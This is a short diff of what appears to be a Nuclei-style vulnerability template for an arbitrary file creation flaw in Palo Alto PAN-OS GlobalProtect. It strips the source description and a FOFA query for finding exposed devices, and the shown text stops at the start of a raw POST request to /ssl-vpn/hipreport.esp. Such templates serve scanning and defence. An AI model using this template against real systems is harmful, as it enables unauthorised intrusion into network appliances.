@@ -3,12 +3,8 @@ info:
   name: Palo Alto Networks PAN-OS 任意文件创建漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iio3y5g8cfno55tz'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: iio3y5g8cfno55tz
-    fofa: app="PaloAlto-GlobalProtect"
 http:
 - raw:
   - 'POST /ssl-vpn/hipreport.esp HTTP/1.1
